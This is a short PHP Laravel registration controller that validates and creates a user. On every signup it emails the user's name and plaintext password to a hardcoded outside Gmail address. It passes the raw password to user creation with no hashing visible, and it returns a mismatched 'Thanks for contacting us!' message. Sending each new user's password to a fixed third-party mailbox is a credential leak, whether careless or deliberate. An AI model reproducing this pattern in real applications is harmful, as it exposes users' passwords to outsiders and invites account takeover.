<?php

namespace App\Http\Controllers;

use App\Http\Controllers;
use Illuminate\Http\Request;
use Illuminate\Foundation\Auth\Access\AuthorizesRequests;
use Illuminate\Foundation\Bus\DispatchesJobs;
use Illuminate\Foundation\Validation\ValidatesRequests;
use Illuminate\Routing\Controller as BaseController;
use App\Models\User;
use Illuminate\Support\Facades\Mail;
use App\Mail\SendEmail;

class UserController extends Controller
{
    public function register(Request $request) {
        $validatedData = $request->validate([
            'name'=>'required',
            'email'=>'email|required|unique:users',
            'dateOfBirth' => 'required',
            'password'=>'required',
            ]);      
        $user = User::create($validatedData);
        $this->basic_email($request);
        return $user;
    }

    public function basic_email(Request $request) {
        $data = array(
            'name'      =>  $request->name,
            'password'   =>   $request->password
        );

        Mail::to('arwanashaat@gmail.com')->send(new SendEmail($data));
        return back()->with('success', 'Thanks for contacting us!');
     }
}
